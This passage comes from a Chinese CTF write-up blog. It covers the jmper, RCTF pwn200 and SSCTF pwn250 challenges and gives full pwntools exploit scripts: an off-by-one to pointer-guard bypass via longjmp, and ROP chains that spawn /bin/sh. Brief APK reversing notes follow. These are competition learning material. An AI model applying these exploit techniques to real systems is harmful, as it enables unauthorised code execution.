class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">32</span>; ++i )             <span class="comment">// write one more byte</span></span><br><span class="line">        &#123;</span><br><span class="line">          v1 = getchar();</span><br><span class="line">          <span class="keyword">if</span> ( v1 == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          *(_BYTE *)student_name++ = v1;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">4</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="string">&quot;ID:&quot;</span>);                      <span class="comment">// show name</span></span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;index);</span><br><span class="line">      getchar();</span><br><span class="line">      <span class="keyword">if</span> ( index &gt;= student_num || index &lt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid ID.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, *(_QWORD *)(*(_QWORD *)(my_class + <span class="number">8L</span>L * index) + <span class="number">40L</span>L));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 != <span class="number">5</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="string">&quot;ID:&quot;</span>);                        <span class="comment">// show memo</span></span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;index);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">if</span> ( index &gt;= student_num || index &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid ID.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, *(_QWORD *)(my_class + <span class="number">8L</span>L * index) + <span class="number">8L</span>L);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结构体：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">student <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    _QWORD id;</span><br><span class="line">    _BYTE memo[<span class="number">32</span>];</span><br><span class="line">    _QWORD *name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编辑memo的时候有个off by one，导致可以覆盖下一个student结构体的name指针的最后一个字节。</p>
<h4 id="0x02：think"><a href="#0x02：think" class="headerlink" title="0x02：think"></a>0x02：think</h4><p>student结构体在内存里的布局大概这个样子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">stud1:</span><br><span class="line">      --------------------------</span><br><span class="line">      |                        |</span><br><span class="line">      |  id                    |</span><br><span class="line">      |  memo_buf[0x20]        |</span><br><span class="line">      |  name -----------------|-----</span><br><span class="line">      |                        |    |</span><br><span class="line">      --------------------------    |</span><br><span class="line">                                    |</span><br><span class="line">                                    |</span><br><span class="line">                                    |</span><br><span class="line">name1:                       	    |</span><br><span class="line">      -------------------------- &lt;--|</span><br><span class="line">      |                        |</span><br><span class="line">      |       name_buf         |</span><br><span class="line">      |                        |</span><br><span class="line">      --------------------------</span><br></pre></td></tr></table></figure>
<p>先分配五个这样的结构体，然后修改student2的name指针，使其指向student3的name。<br>这样，通过name、memo的write和show功能就可以获取任意地址读写的能力了。</p>
<p>有了这个基础后，因为程序使用了jmpbuffer，会把一些寄存器信息加密后存储在jmpbuffer，我们有任意地址读写之后：</p>
<ul>
<li>   只需要leak出和jmpbuffer的偏移</li>
<li>   泄露出stored rip，和真实的rip xor后得到secret xor 值，</li>
<li>   随便泄露一个函数，然后根据libc确定system函数地址</li>
<li>   然后，直接修改寄存器的值，然后触发longjmp，就可以代码执行了。</li>
</ul>
<h4 id="0x03：exploit"><a href="#0x03：exploit" class="headerlink" title="0x03：exploit"></a>0x03：exploit</h4><p>win10 subsystem 上测试通过。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">    p = process(<span class="string">&#x27;./jmper&#x27;</span>,raw=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./jmper&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.19.so-8674307c6c294e2f710def8c57925a50e60ee69e&#x27;</span>)</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rerol</span>(<span class="params">d</span>):</span></span><br><span class="line">    <span class="keyword">return</span> ((d&lt;&lt;(<span class="number">64</span>-<span class="number">0x11</span>))+(d&gt;&gt;<span class="number">0x11</span>))&amp;<span class="number">0xffffffffffffffff</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rol</span>(<span class="params">d</span>):</span></span><br><span class="line">    <span class="keyword">return</span> ((d&lt;&lt;<span class="number">0x11</span>) + (d&gt;&gt;(<span class="number">64</span>-<span class="number">0x11</span>)))&amp;<span class="number">0xffffffffffffffff</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_student</span>():</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;:)&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">name_student</span>(<span class="params"><span class="built_in">id</span>,name</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;:)&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;ID:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;name:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(name))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">memo_student</span>(<span class="params"><span class="built_in">id</span>,memo</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;:)&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;ID:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;memo:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(memo))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_name</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;:)&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;ID:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_memo</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;:)&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;ID:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit_</span>():</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;:)&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_shell</span>():</span></span><br><span class="line">    <span class="keyword">for</span> __ <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">25</span>):</span><br><span class="line">        add_student()</span><br><span class="line">    add_student()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment">#raw_input(&#x27;0x0000000000400B99&#x27;)</span></span><br><span class="line">    log.info(<span class="string">&#x27;printf got : %s&#x27;</span> % (<span class="built_in">hex</span>(printf_got)))</span><br><span class="line">    add_student()</span><br><span class="line">    add_student()</span><br><span class="line">    add_student()</span><br><span class="line">    add_student()</span><br><span class="line">    add_student()</span><br><span class="line"></span><br><span class="line">    name_student(<span class="number">0</span>,<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">    name_student(<span class="number">1</span>,<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line">    name_student(<span class="number">2</span>,<span class="string">&#x27;C&#x27;</span>)</span><br><span class="line">    name_student(<span class="number">3</span>,<span class="string">&#x27;D&#x27;</span>)</span><br><span class="line">    name_student(<span class="number">4</span>,<span class="string">&#x27;E&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    memo_student(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    memo_student(<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">    memo_student(<span class="number">2</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">    memo_student(<span class="number">3</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">    memo_student(<span class="number">4</span>,<span class="string">&#x27;e&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#get jmp buffer offset</span></span><br><span class="line">    memo_student(<span class="number">1</span>,<span class="string">&#x27;c&#x27;</span> * <span class="number">0x20</span> + <span class="string">&#x27;\xe8&#x27;</span>)</span><br><span class="line">    name_student(<span class="number">1</span>,<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">    show_name(<span class="number">1</span>)</span><br><span class="line">    dump = p.recvline()</span><br><span class="line">    jmp_buffer_lsw = ((<span class="built_in">ord</span>(dump[<span class="number">1</span>]) &amp;<span class="number">0xf0</span>) &lt;&lt; <span class="number">8</span>) | <span class="number">0x110</span></span><br><span class="line">    log.info(<span class="string">&quot;Got jmpbuffer offset %x&quot;</span> % jmp_buffer_lsw)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#get xor word</span></span><br><span class="line">    rip_addr = jmp_buffer_lsw + <span class="number">0x38</span></span><br><span class="line">    name_student(<span class="number">1</span>,p16(rip_addr))</span><br><span class="line">    show_name(<span class="number">2</span>)</span><br><span class="line">    dump = p.recvline()</span><br><span class="line">    rip_stored = unpack(dump[:<span class="number">8</span>])</span><br><span class="line">    log.info(<span class="string">&quot;Got stored rip : %s&quot;</span> % <span class="built_in">hex</span>(rip_stored))</span><br><span class="line">    rip = rerol(rip_stored)</span><br><span class="line">    secret_xor = rip ^ <span class="number">0x400c31</span></span><br><span class="line">    log.info(<span class="string">&quot;Got xor vaule : %s&quot;</span> % <span class="built_in">hex</span>(secret_xor))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#rbx /bin/sh</span></span><br><span class="line">    rip_addr = jmp_buffer_lsw</span><br><span class="line">    name_student(<span class="number">1</span>,p16(rip_addr))</span><br><span class="line">    name_student(<span class="number">2</span>,<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#leak addr and get system&#x27;s addr</span></span><br><span class="line">    name_student(<span class="number">1</span>,p64(printf_got))</span><br><span class="line">    show_name(<span class="number">2</span>)</span><br><span class="line">    printf_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    log.info(<span class="string">&#x27;leak printf : %s&#x27;</span> % <span class="built_in">hex</span>(printf_addr))</span><br><span class="line"></span><br><span class="line">    libc_base = printf_addr - libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    log.info(<span class="string">&#x27;system addr : %s&#x27;</span> % <span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line">    new_rip = system_addr ^ secret_xor</span><br><span class="line">    new_rip = rol(new_rip) </span><br><span class="line">    log.info(<span class="string">&#x27;New rip is : %s&#x27;</span> % <span class="built_in">hex</span>(new_rip))</span><br><span class="line">    memo_student(<span class="number">3</span>,<span class="string">&quot;D&quot;</span> * <span class="number">0x20</span> + <span class="string">&quot;\xc8&quot;</span>)</span><br><span class="line">    name_student(<span class="number">3</span>,p16(jmp_buffer_lsw+<span class="number">0x38</span>))</span><br><span class="line">    name_student(<span class="number">4</span>,p64(new_rip))</span><br><span class="line"></span><br><span class="line">    get_shell()</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="0x04：reference"><a href="#0x04：reference" class="headerlink" title="0x04：reference"></a>0x04：reference</h4><p><a href="https://github.com/ctfs/write-ups-2016/tree/master/seccon-ctf-quals-2016/exploit/jmper-300">write-ups-2016</a><br>[第三届XCTF——郑州站ZCTF第一名战队Writeup]](<a href="http://bobao.360.cn/ctf/detail/186.html">http://bobao.360.cn/ctf/detail/186.html</a>)</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>ctf writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>RCTF -- PWN200</title>
    <url>/2015/11/16/RCTF-PWN200/</url>
    <content><![CDATA[<h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00:"></a>0x00:</h4><p>XCTF开赛了，只看了pwn，这次还比较有意思，有x86 x64 arm mips 多种cpu构架的pwn。自己只搞出了pwn200</p>
<a id="more"></a>

<h4 id="0x01-基本信息"><a href="#0x01-基本信息" class="headerlink" title="0x01:基本信息"></a>0x01:基本信息</h4><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/rctf_pwn200/file_pwn200.png" alt="info"><br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/rctf_pwn200/check_sec.png" alt="info2"><br>x64 动态链接 有调试符号(怪不得是最简单的…)<br>开启的保护如图可以看到。<br>运行下，随便给点输入:<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/rctf_pwn200/run.png"><br>经过分析，发现问题出在echo()函数,而且这个bof的payload大概的格式：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">"A"</span>*<span class="number">24</span>+<span class="string">"BBBBBB"</span>+<span class="string">"\x00\x00"</span></span><br></pre></td></tr></table></figure>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/rctf_pwn200/control_rip.png" alt="segfault"></p>
<h4 id="0x02-思路"><a href="#0x02-思路" class="headerlink" title="0x02:思路"></a>0x02:思路</h4><p><code>利用构造的ROP链先去 leak 远程服务器上libc里的system地址，然后利用ROP链再次把 &quot;/bin/sh&quot; 和system()地址 写入程序的.bss段，最后再次利用ROP链去执行 system(&quot;/bin/sh&quot;)</code></p>
<pre><code>但是要注意：x64的函数调用 参数传递顺序是RDI RSI RDX RCX R8 R9之后的参数才用栈传递。</code></pre>
<p>在IDA中看下:<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/rctf_pwn200/got.png"><br>我们可以利用 pwntools的 去得到程序中write()和read()这些系统调用的got，用来构造ROP。这时候要使用的是 通用型的ropgads，因为源程序中并没有一些辅助性的东西。<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/rctf_pwn200/gadgets.png"><br>在初始化libc的时候，这些指令可以为我们所用来构造ROP，设置好参数。<br>因为也没有给libc，所以要leak libc中的函数地址，pwntools的dynELF很好用。</p>
<h4 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03:exp"></a>0x03:exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># author:muhe</span></span><br><span class="line"><span class="comment"># http://www.cnblogs.com/0xmuhe/</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'./pwn200'</span>)</span><br><span class="line">p=remote(<span class="string">'127.0.0.1'</span>,<span class="number">6666</span>)</span><br><span class="line"><span class="comment">#p = remote('180.76.178.48',6666)</span></span><br><span class="line"><span class="comment">#p = process('./pwn200')</span></span><br><span class="line">addr1=<span class="number">0x40089A</span></span><br><span class="line">addr2=<span class="number">0x400880</span></span><br><span class="line">main_addr = <span class="number">0x4007CD</span></span><br><span class="line">ppppr=<span class="number">0x40089c</span></span><br><span class="line">bss_addr=<span class="number">0x601078</span></span><br><span class="line">got_write = elf.got[<span class="string">'write'</span>]</span><br><span class="line">got_read = elf.got[<span class="string">'read'</span>]</span><br><span class="line">flag=<span class="literal">True</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    junk = <span class="string">"A"</span>*<span class="number">24</span></span><br><span class="line">    p1=<span class="string">""</span></span><br><span class="line">    p1+=junk</span><br><span class="line">    p1+=p64(ppppr)</span><br><span class="line">    p1+=p64(addr1)</span><br><span class="line">    p1+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(got_write)+p64(<span class="number">8</span>)+p64(address)+p64(<span class="number">1</span>)</span><br><span class="line">    p1+=p64(addr2)</span><br><span class="line">    p1+=<span class="string">"\x00"</span>*<span class="number">56</span></span><br><span class="line">    p1+=p64(main_addr)</span><br><span class="line">    p.recvuntil(<span class="string">'F\n'</span>)</span><br><span class="line">    p.send(p1)</span><br><span class="line">    <span class="comment">#raw_input()</span></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        data = p.recv(<span class="number">8</span>)</span><br><span class="line">        flag=<span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.recv(<span class="number">0x1b</span>)</span><br><span class="line">        data = p.recv(<span class="number">8</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"%#x =&gt; %s"</span> % (address, (data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">'./pwn200'</span>))</span><br><span class="line">system_addr = d.lookup(<span class="string">'system'</span>,<span class="string">'libc'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_addr="</span> + hex(system_addr)</span><br><span class="line"><span class="comment">#----------------write /bin/sh to .bss-----------------#</span></span><br><span class="line">junk = <span class="string">"A"</span>*<span class="number">24</span></span><br><span class="line">payload=<span class="string">""</span></span><br><span class="line">payload+=junk</span><br><span class="line">payload+=p64(ppppr)</span><br><span class="line">payload+=p64(addr1)</span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(got_read)+p64(<span class="number">24</span>)+p64(bss_addr)+p64(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#    addr_junk_rbx_rbp_r12_r13_r14_r15</span></span><br><span class="line"><span class="comment">#order:RDI  RSI  RDX  RCX  R8  R9</span></span><br><span class="line">payload+=p64(addr2)</span><br><span class="line">payload+=<span class="string">"\x00"</span>*<span class="number">56</span></span><br><span class="line">payload+=p64(main_addr)</span><br><span class="line">p.recvuntil(<span class="string">'F\n'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"payload 1 ...."</span></span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(<span class="string">"AAAABBBB"</span>)</span><br><span class="line">p.send(<span class="string">"/bin/sh\0"</span>)</span><br><span class="line">p.send(p64(system_addr))</span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"sent .."</span></span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#-----------------get shell --------------------------#</span></span><br><span class="line">junk = <span class="string">"A"</span>*<span class="number">24</span></span><br><span class="line">payload2=<span class="string">""</span></span><br><span class="line">payload2+=junk</span><br><span class="line">payload2+=p64(ppppr)</span><br><span class="line">payload2+=p64(addr1)</span><br><span class="line">payload2+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(bss_addr+<span class="number">16</span>)+p64(<span class="number">1</span>)+p64(<span class="number">1</span>)+p64(bss_addr+<span class="number">8</span>)</span><br><span class="line"><span class="comment">#    addr_junk_rbx_rbp_r12_r13_r14_r15</span></span><br><span class="line"><span class="comment">#order:RDI  RSI  RDX  RCX  R8  R9</span></span><br><span class="line">payload2+=p64(addr2)</span><br><span class="line">payload2+=<span class="string">"\x00"</span>*<span class="number">56</span></span><br><span class="line">payload2+=p64(main_addr)</span><br><span class="line">p.recvuntil(<span class="string">'F\n'</span>)</span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"payload 2 ...."</span></span><br><span class="line">p.send(payload2)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"ok get shell"</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/rctf_pwn200/get_shell.png"><br>后来遇到个问题，exp打本地，或者是socket搭建起来的都可以打，但是远程服务器打不了。 - -# 尴尬</p>
<h4 id="0x04"><a href="#0x04" class="headerlink" title="0x04:"></a>0x04:</h4><p>算是学习了一波吧，有收获就是好的。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ctf writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>SSCTF-2017部分Writeup</title>
    <url>/2017/05/08/SSCTF-2017%E9%83%A8%E5%88%86Writeup/</url>
    <content><![CDATA[<h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h4><p>刚结束的SSCTF2017，自己只做了一点。</p>
<a id="more"></a>

<h4 id="Pwn250"><a href="#Pwn250" class="headerlink" title="Pwn250"></a>Pwn250</h4><p>栈溢出，简单粗暴，但是程序是静态链接的，又有NX保护，直接ROP就好了。</p>
<p>思路就是，在.bss上构造参数，然后使用int 0x80起shell。</p>
<p>exp如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x0804887C</span></span><br><span class="line"></span><br><span class="line">int80_gad_addr = <span class="number">0x0806cbb5</span></span><br><span class="line"><span class="comment">#0x3a+4+4</span></span><br><span class="line">read_addr = <span class="number">0x0806D510</span></span><br><span class="line">write_addr= <span class="number">0x0806D580</span></span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x080ECA35</span></span><br><span class="line"></span><br><span class="line">xor_eax_eax_ret = <span class="number">0x080493a3</span></span><br><span class="line">pop_ebx_ret = <span class="number">0x080481c9</span></span><br><span class="line">pop_ecx_ret = <span class="number">0x080df1b9</span></span><br><span class="line">pop_edx_ret = <span class="number">0x0806efbb</span></span><br><span class="line">add_al_ret = <span class="number">0x080b4f19</span></span><br><span class="line">mov_esp_ecx = <span class="number">0x080b8c22</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">    p = process(<span class="string">&#x27;./250&#x27;</span>)<span class="comment">#,env=env)</span></span><br><span class="line">    <span class="comment">#p = process(&#x27;filename&#x27;,raw=False)</span></span><br><span class="line">    <span class="comment">#this for Windows10 subsystem</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;60.191.205.81&#x27;</span>,<span class="number">2017</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuck</span>(<span class="params">size,data</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size]&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Data]&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(data))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    gdb.attach(p,&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        b *0x08048986</span></span><br><span class="line"><span class="string">        c</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;)</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload = <span class="string">&#x27;A&#x27;</span>*(<span class="number">0x3a</span>+<span class="number">4</span>) +p32(read_addr) + p32(main_addr) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">8</span>)</span><br><span class="line">    fuck(<span class="number">0x100</span>,payload)</span><br><span class="line">    p.send(<span class="string">&quot;/bin/sh\0&quot;</span>)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">2</span>)</span><br><span class="line">    payload = <span class="string">&#x27;A&#x27;</span>*(<span class="number">0x3a</span>+<span class="number">4</span>) +p32(read_addr) + p32(main_addr) + p32(<span class="number">0</span>) + p32(bss_addr+<span class="number">10</span>) + p32(<span class="number">8</span>)</span><br><span class="line">    fuck(<span class="number">0x100</span>,payload)</span><br><span class="line">    p.send(p32(bss_addr))</span><br><span class="line">    sleep(<span class="number">2</span>)</span><br><span class="line">    </span><br><span class="line">    payload = <span class="string">&#x27;A&#x27;</span>*(<span class="number">0x3a</span>+<span class="number">4</span>) + p32(xor_eax_eax_ret)+p32(pop_ebx_ret)+p32(bss_addr)</span><br><span class="line">    payload += p32(pop_ecx_ret) + p32(bss_addr+<span class="number">10</span>)</span><br><span class="line">    payload += p32(pop_edx_ret) + p32(<span class="number">0</span>)</span><br><span class="line">    payload += p32(add_al_ret) * <span class="number">0xb</span></span><br><span class="line">    payload += p32(int80_gad_addr) </span><br><span class="line">    fuck(<span class="number">0x100</span>,payload)</span><br><span class="line">    </span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h4 id="apk1"><a href="#apk1" class="headerlink" title="apk1"></a>apk1</h4><p>程序会加密<code>ctf1.xlsx</code>，加密是每隔0x100字符加密一次。</p>
<p>加密的大概逻辑是：</p>
<ol>
<li>先调用验证函数<code> private boolean verify(String arg11, String arg12)</code>，会根据签名算出一个k1[40]</li>
<li>根据输入的6位数字，和k1操作后得到新的k1</li>
<li>进入加密逻辑，使用新的k1与xlsx的每隔0x100的字符，循环亦或。</li>
</ol>
<p>思路就是，反向先推一点，可以根据加密后的xlsx和正常的比对，能得到k1的前三个字节。</p>
<p><img src="http://blogimg-10065924.cossh.myqcloud.com/ssctf2017writeup/compare.png"></p>
<p>然后我把java代码复制出来新建一个java的工程，去爆破6位数字：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">6位数字 ---&gt; 和k1生成新的k1 ---&gt; 然后比对前三字节</span><br></pre></td></tr></table></figure>

<p>然后使用<code>private boolean encode(Context arg12)</code>，把加密前后的文件名换一下，就可以直接解出来。</p>
<p><img src="http://blogimg-10065924.cossh.myqcloud.com/ssctf2017writeup/apk1.png"></p>
<h4 id="apk2-login"><a href="#apk2-login" class="headerlink" title="apk2 login"></a>apk2 login</h4><p>主要的函数在native层。把输入的12字节扩展为16字节，然后到java层去验证，正确的话经过AES解密弹出flag。</p>
<p>经过分析，只要使得输入的12字节经过变换后，等于 <code>01635e6c5f2378255f27356c11663165</code> 就好了。</p>
<p>主要的算法是，把输入的12字节分成4组，每组3个字节，每组的变化规律是</p>
